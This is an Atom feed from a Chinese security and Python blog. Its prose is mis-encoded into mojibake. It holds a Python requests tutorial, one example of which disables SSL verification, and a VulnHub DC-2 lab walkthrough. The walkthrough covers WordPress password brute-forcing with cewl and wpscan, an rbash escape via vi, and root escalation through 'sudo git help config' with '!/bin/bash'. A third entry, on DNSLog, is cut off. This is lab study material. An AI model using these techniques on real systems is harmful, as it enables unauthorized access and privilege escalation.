<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Edsion&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-17T06:31:54.418Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Edsion Shen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>requeståº“ä½¿ç”¨</title>
    <link href="http://yoursite.com/2020/07/17/requests%E5%BA%93/"/>
    <id>http://yoursite.com/2020/07/17/requests%E5%BA%93/</id>
    <published>2020-07-17T06:30:12.000Z</published>
    <updated>2020-07-17T06:31:54.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ„é€ è¯·æ±‚">æ„é€ è¯·æ±‚</h2><h3 id="è¯·æ±‚å¤´">è¯·æ±‚å¤´</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;<span class="string">'Accept'</span>: <span class="string">'application/vnd.github.v3.text-match+json'</span>&#125;</span><br><span class="line">res = requests.get(url,headers)</span><br></pre></td></tr></table></figure><h3 id="getè¯·æ±‚">getè¯·æ±‚</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res = requests.get(url=<span class="string">'https://api.github.com/search/repositories'</span>)</span><br><span class="line">å‚æ•°</span><br><span class="line"><span class="comment"># res = requests.get(url,params)</span></span><br><span class="line"><span class="comment"># params=&#123;'q':'requests+language:python'&#125;</span></span><br><span class="line"><span class="comment"># params=[('q', 'requests+language:python')]</span></span><br><span class="line"><span class="comment"># params=b'q=requests+language:python'</span></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–è¯·æ±‚æ–¹æ³•">å…¶ä»–è¯·æ±‚æ–¹æ³•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.post(<span class="string">'https://httpbin.org/post'</span>, data=&#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.put(<span class="string">'https://httpbin.org/put'</span>, data=&#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.delete(<span class="string">'https://httpbin.org/delete'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.head(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.patch(<span class="string">'https://httpbin.org/patch'</span>, data=&#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.options(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">æ¶ˆæ¯ä½“</span><br><span class="line"><span class="comment">#  data=&#123;'key':'value'&#125;</span></span><br><span class="line"><span class="comment">#  data=[('key', 'value')&#125;</span></span><br><span class="line"><span class="comment">#  json=&#123;'key':'value'&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å“åº”å¤„ç†">å“åº”å¤„ç†</h2><h3 id="å“åº”çŠ¶æ€ç ">å“åº”çŠ¶æ€ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status = res.status_code</span><br></pre></td></tr></table></figure><h3 id="å“åº”å¤´ä¿¡æ¯ï¼ˆé”®ä¸åˆ†å¤§å°å†™ï¼‰">å“åº”å¤´ä¿¡æ¯ï¼ˆé”®ä¸åˆ†å¤§å°å†™ï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests_header=res.headers[<span class="string">'content-type'</span>]</span><br></pre></td></tr></table></figure><h3 id="å“åº”å†…å®¹">å“åº”å†…å®¹</h3><h4 id="å­—èŠ‚æ ¼å¼æŸ¥çœ‹å†…å®¹">å­—èŠ‚æ ¼å¼æŸ¥çœ‹å†…å®¹</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = res.content</span><br><span class="line"><span class="comment"># b'&#123;\n  "current_user_url": "https://api.github.com/user",\n  "cur</span></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²æ ¼å¼æŸ¥çœ‹å†…å®¹ï¼ˆåºåˆ—åŒ–JSONï¼‰">å­—ç¬¦ä¸²æ ¼å¼æŸ¥çœ‹å†…å®¹ï¼ˆåºåˆ—åŒ–JSONï¼‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºå¯¹ bytes è§£ç åˆ° str éœ€è¦ä¸€ä¸ªç¼–ç æ ¼å¼ï¼Œæ‰€ä»¥å¦‚æœä½ æ²¡æœ‰æŒ‡å®šï¼Œè¯·æ±‚å°†å°è¯•æ ¹æ®å“åº”å¤´æ¥çŒœæµ‹ç¼–ç æ ¼å¼</span><br><span class="line">res.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line">data=res.text</span><br><span class="line"><span class="comment"># &#123;"current_user_url":"https://api.github.com/user","cur</span></span><br></pre></td></tr></table></figure><h4 id="å­—å…¸å½¢å¼å†…å®¹ï¼ˆååºåˆ—åŒ–JSONï¼‰">å­—å…¸å½¢å¼å†…å®¹ï¼ˆååºåˆ—åŒ–JSONï¼‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="comment"># &#123;'current_user_url': 'https://api.github.com/user', 'curin</span></span><br><span class="line">æå–å†…å®¹</span><br><span class="line">repository = data[<span class="string">'items'</span>][<span class="number">0</span>]</span><br><span class="line">ä¹Ÿå¯ä»¥ä½¿ç”¨ .text è·å– str å¹¶ä½¿ç”¨json.loads() å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–</span><br><span class="line">json.loads(data)</span><br></pre></td></tr></table></figure><h2 id="å…¶ä»–">å…¶ä»–</h2><h3 id="æ£€æŸ¥è¯·æ±‚">æ£€æŸ¥è¯·æ±‚</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">requests åº“ä¼šåœ¨å°†è¯·æ±‚å®é™…å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ä¹‹å‰å‡†å¤‡è¯¥è¯·æ±‚ã€‚ è¯·æ±‚å‡†å¤‡åŒ…æ‹¬åƒéªŒè¯å¤´ä¿¡æ¯å’Œåºåˆ—åŒ–JSONå†…å®¹ç­‰</span><br><span class="line">response.request.headers[<span class="string">'Content-Type'</span>]</span><br><span class="line">response.request.url</span><br><span class="line">response.request.body</span><br></pre></td></tr></table></figure><h3 id="èº«ä»½éªŒè¯">èº«ä»½éªŒè¯</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨auth å‚æ•°ï¼Œrqeuests å°†ä½¿ç”¨HTTPçš„åŸºæœ¬è®¿é—®è®¤è¯æ–¹æ¡ˆæ¥åº”ç”¨å‡­æ®</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com/user'</span>, auth=(<span class="string">'username'</span>, getpass()))</span><br><span class="line">æˆåŠŸè¿”å›&lt;Response [<span class="number">200</span>]&gt;ï¼Œå¤±è´¥è¿”å›&lt;Response [<span class="number">401</span>]&gt;</span><br><span class="line"></span><br><span class="line">HTTPBasicAuthæ•ˆæœåŒä¸Š</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com/user'</span>, auth=HTTPBasicAuth(<span class="string">'username'</span>, getpass()))</span><br><span class="line"></span><br><span class="line">requests ä¹Ÿæä¾›äº†å…¶ä»–èº«ä»½éªŒè¯æ–¹æ³•ï¼Œä¾‹å¦‚ HTTPDigestAuth å’Œ HTTPProxyAuth</span><br></pre></td></tr></table></figure><h3 id="å…³é—­SSLè¯ä¹¦éªŒè¯">å…³é—­SSLè¯ä¹¦éªŒè¯</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com'</span>, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="æ€§èƒ½">æ€§èƒ½</h2><h3 id="è¶…æ—¶">è¶…æ—¶</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com'</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">è¿˜å¯ä»¥å°†å…ƒç»„ä¼ é€’ç»™ timeoutï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯è¿æ¥è¶…æ—¶ï¼ˆå®ƒå…è®¸å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥çš„æ—¶é—´ï¼‰ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯è¯»å–è¶…æ—¶ï¼ˆä¸€æ—¦ä½ çš„å®¢æˆ·å·²å»ºç«‹è¿æ¥è€Œç­‰å¾…å“åº”çš„æ—¶é—´ï¼‰</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com'</span>, timeout=(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">è¶…æ—¶å¼‚å¸¸</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://api.github.com'</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Timeout:</span><br><span class="line">    print(<span class="string">'The request timed out'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'The request did not time out'</span>)</span><br></pre></td></tr></table></figure><h3 id="Sessionå¯¹è±¡">Sessionå¯¹è±¡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Session ç”¨äºè·¨è¯·æ±‚ä¿ç•™å‚æ•°ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦è·¨å¤šä¸ªè¯·æ±‚ä½¿ç”¨ç›¸åŒçš„èº«ä»½éªŒè¯,å½“ä½ çš„åº”ç”¨ç¨‹åºæƒ³è¦å†æ¬¡è¿æ¥åˆ°åŒä¸€æœåŠ¡å™¨æ—¶ï¼Œå®ƒå°†é‡ç”¨æ± ä¸­çš„è¿æ¥è€Œä¸æ˜¯å»ºç«‹æ–°è¿æ¥ã€‚</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    session.auth = (<span class="string">'username'</span>, getpass())</span><br><span class="line">    response = session.get(<span class="string">'https://api.github.com/user'</span>)</span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§é‡è¯•">æœ€å¤§é‡è¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡ Transport Adaptersï¼Œä½ å¯ä»¥ä¸ºæ¯ä¸ªä¸ä¹‹äº¤äº’çš„æœåŠ¡å®šä¹‰ä¸€ç»„é…ç½®ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ å¸Œæœ›æ‰€æœ‰å¯¹äºhttps://api.github.comçš„è¯·æ±‚åœ¨æœ€ç»ˆæŠ›å‡º ConnectionError ä¹‹å‰é‡è¯•ä¸‰æ¬¡ã€‚ ä½ å°†æ„å»ºä¸€ä¸ª Transport Adapterï¼Œè®¾ç½®å…¶ max_retries å‚æ•°ï¼Œå¹¶å°†å…¶è£…è½½åˆ°ç°æœ‰çš„ Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">github_adapter = HTTPAdapter(max_retries=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use `github_adapter` for all requests to endpoints that start with this URL</span></span><br><span class="line">session.mount(<span class="string">'https://api.github.com'</span>, github_adapter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session.get(<span class="string">'https://api.github.com'</span>)</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> ce:</span><br><span class="line">    print(ce)</span><br></pre></td></tr></table></figure><h2 id="ç»“å°¾">ç»“å°¾</h2><blockquote><blockquote><p>reåº“å‚è€ƒï¼š<a href="https://juejin.im/post/5d8c630e51882511f444f65b" target="_blank" rel="noopener">https://juejin.im/post/5d8c630e51882511f444f65b</a></p></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;æ„é€ è¯·æ±‚&quot;&gt;æ„é€ è¯·æ±‚&lt;/h2&gt;
&lt;h3 id=&quot;è¯·æ±‚å¤´&quot;&gt;è¯·æ±‚å¤´&lt;/h3&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="pythonåº“" scheme="http://yoursite.com/tags/python%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>VulnHubæ¸—é€ä¹‹DC-2</title>
    <link href="http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/"/>
    <id>http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/</id>
    <published>2020-07-08T11:34:52.000Z</published>
    <updated>2020-07-08T11:34:47.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0Ã—00-è¯´æ˜">0Ã—00 è¯´æ˜</h2><p><strong>çŸ¥è¯†ç‚¹ï¼šWordPressã€å—é™shellã€gitææƒ</strong></p><blockquote><p>kaliï¼š192.168.101.10<br>é¶æœºå’Œkaliå¤„äºåŒä¸€å±€åŸŸç½‘</p></blockquote><h2 id="0x01-ä¿¡æ¯æ”¶é›†">0x01 ä¿¡æ¯æ”¶é›†</h2><ol><li>æ¢æµ‹ç›®æ ‡åœ°å€</li></ol><p>å‘½ä»¤ï¼š<code>arp-scan -l</code> æˆ–è€… <code>nmap -sP 192.168.101.0/24</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708153613.png" alt=""></p><p>é¶æœºåœ°å€ä¸º192.168.101.17</p><ol start="2"><li>æ¢æµ‹ç›®æ ‡å¼€æ”¾ç«¯å£</li></ol><p>å‘½ä»¤ï¼š<code>nmap -sV -p- 192.168.101.17</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154210.png" alt=""></p><p>é¶æœºå¼€æ”¾äº†80ç«¯å£å’Œ7744ç«¯å£ï¼Œ7744ä¸ºSSHï¼Œå…ˆè®¿é—®ä¸‹80</p><blockquote><p>tsï¼šéœ€è¦å…ˆä¿®æ”¹hostsæ–‡ä»¶ï¼Œkaliä¸Šçš„hostsä½ç½®åœ¨ /etc/hosts</p></blockquote><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154819.png" alt=""></p><h2 id="0x02-Flag1">0x02 Flag1</h2><p>è®¿é—®æˆåŠŸï¼Œä½¿ç”¨wappalyzeræŸ¥çœ‹ä¸‹ç½‘ç«™æ‰€ä½¿ç”¨çš„æŠ€æœ¯</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708155044.png" alt=""></p><p>ç½‘ç«™ä¸º WordPress CMSæ„å»ºï¼Œå¹¶ä¸”å‘ç°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154934.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just canâ€™t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you canâ€™t find it, log in as another.</span><br></pre></td></tr></table></figure><p>æç¤ºä½¿ç”¨cewlå·¥å…·ï¼Œå¹¶ä¸”åªæœ‰ç™»é™†ä¹‹åæ‰èƒ½çœ‹åˆ°ä¸‹ä¸€ä¸ªflag</p><h2 id="0x03-Flag2">0x03 Flag2</h2><p>cewlå·¥å…·å¯ä»¥æ ¹æ®urlæ¥ç”Ÿæˆå¯¹åº”çš„å¯†ç å­—å…¸<br>å‘½ä»¤ï¼š<code>cewl -w /root/dic/dc2_passwd.txt http://dc-2/</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161432.png" alt=""></p><p>æœ‰äº†å¯†ç ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨wpscanï¼Œå®ƒå¯ä»¥æŸ¥è¯¢å‡ºwordpressçš„ç”¨æˆ·åï¼Œ-e uæ˜¯æšä¸¾ç”¨æˆ·åï¼Œé»˜è®¤ä»1-10<br>å‘½ä»¤ï¼š<code>wpscan --url http://dc-2/ -e u</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161924.png" alt=""></p><p>æ¥ä¸‹æ¥ï¼Œæ‰¾å‡º WordPress ç™»é™†åœ°å€ï¼Œå¯ä»¥ç½‘ä¸ŠæŸ¥æ‰¾æˆ–è€…å·¥å…·å»æ‰«æ<br>å·¥å…·å¯ä»¥ç”¨dirbï¼Œå‘½ä»¤ï¼š<code>dirb http://dc-2/</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708162403.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708165933.png" alt=""></p><p>å­—å…¸åœ°å€éƒ½å…·å¤‡äº†ï¼Œä½¿ç”¨wpscanè¿›è¡Œçˆ†ç ´<br>å‘½ä»¤ï¼š<code>wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171549.png" alt=""></p><p>çˆ†ç ´æˆåŠŸï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ jerry ç™»é™†ï¼Œæ‰¾åˆ°äº†flag2</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171905.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯ï¼ŒWordPressè¡Œä¸é€šå°±æ¢ä¸ªæ–¹å¼</p><h2 id="0x04-Flag3">0x04 Flag3</h2><p>äºæ˜¯æƒ³åˆ°ä¹‹å‰è¿˜æœ‰ä¸ªSSHæœåŠ¡ï¼Œä¾¿å°è¯•ç™»é™†ï¼Œå‘ç°jerryæ— æ³•ç™»å½•ï¼Œtomå¯ä»¥</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172252.png" alt=""><br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172433.png" alt=""></p><p><code>ls</code> å‘ç° <code>flag3.txt</code> åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œä½†æ˜¯ä½¿ç”¨ <code>cat</code> å´æç¤º <code>-rbash: cat: command not found</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172620.png" alt=""></p><p>è¿™æ˜¯ä¸€ä¸ªå—é™shellç¯å¢ƒï¼Œå¸¸è§çš„å—é™shellç¯å¢ƒç±»å‹åŒ…æ‹¬rbashã€rkshå’Œrshï¼Œäºæ˜¯ç°åœ¨éœ€è¦ç»•è¿‡rbashï¼Œ<code>compgen</code>è¿˜èƒ½ä½¿ç”¨ï¼ŒæŸ¥çœ‹ä¸‹å½“å‰å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤<br>å‘½ä»¤ï¼š<code>compgen -c</code></p><blockquote><p>å—é™shellæ˜¯LinuxShellé™åˆ¶ä¸€äº›bash shellä¸­çš„åŠŸèƒ½ï¼Œå¹¶ä¸”æ˜¯ä»åå­—ä¸Šå¾ˆæ¸…æ¥šã€‚ è¯¥é™åˆ¶å¾ˆå¥½åœ°å®ç°&gt; äº†å‘½ä»¤ä»¥åŠè„šæœ¬åœ¨å—é™shellä¸­è¿è¡Œã€‚ å®ƒä¸ºLinuxä¸­çš„bash shellæä¾›äº†ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ã€‚</p></blockquote><p>å¤§æ¦‚æ¸…æ¥šäº†ï¼ŒæŸ¥çœ‹å½“å‰ç¯å¢ƒå˜é‡ï¼š<code>echo $PATH</code>ï¼Œå‘ç°ä½äº<code>/home/tom/usr/bin</code>ä¸‹ï¼Œç”¨<code>vi</code>è½¬ä¹‰å—é™åˆ¶çš„shellï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>ç„¶åè®¾ç½®ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATH</span><br><span class="line">export SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708173847.png" alt=""></p><p>æˆåŠŸç»•è¿‡rbashï¼Œå¹¶è¯»å–äº†flag3.txtçš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œæ˜¯è¦è®©æˆ‘ä»¬åˆ‡æ¢ jerry ç”¨æˆ·</p><h2 id="0x05-Flag4">0x05 Flag4</h2><p>ä½¿ç”¨<code>su jerry</code>åˆ‡æ¢ jerry ç”¨æˆ·ï¼Œå›åˆ°jerryçš„å®¶ç›®å½•æŸ¥çœ‹ï¼Œå‘ç°äº†flag4</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708174603.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure><p>å‘Šè¯‰æˆ‘ä»¬åªå·®æœ€åä¸€ä¸ªflagäº†ï¼Œè¿˜æç¤ºäº† <code>git</code></p><h2 id="0x06-Flag5">0x06 Flag5</h2><p>å…¶å®æ˜¯ä½¿ç”¨<code>git</code>è¿›è¡Œææƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708175605.png" alt=""></p><p>æ‹¿åˆ°æœ€åçš„ flag .</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0Ã—00-è¯´æ˜&quot;&gt;0Ã—00 è¯´æ˜&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;çŸ¥è¯†ç‚¹ï¼šWordPressã€å—é™shellã€gitææƒ&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;kaliï¼š192.168.101.10&lt;br&gt;
é¶æœºå’Œkaliå¤„äºåŒä¸€å±€åŸŸç½‘&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="VulnHub" scheme="http://yoursite.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>é€šè¿‡DNSLogè·å–æ— å›æ˜¾ä¿¡æ¯</title>
    <link href="http://yoursite.com/2020/07/04/DNSLog/"/>
    <id>http://yoursite.com/2020/07/04/DNSLog/</id>
    <published>2020-07-04T13:32:36.000Z</published>
    <updated>2020-07-04T14:15:22.583Z</updated>
    
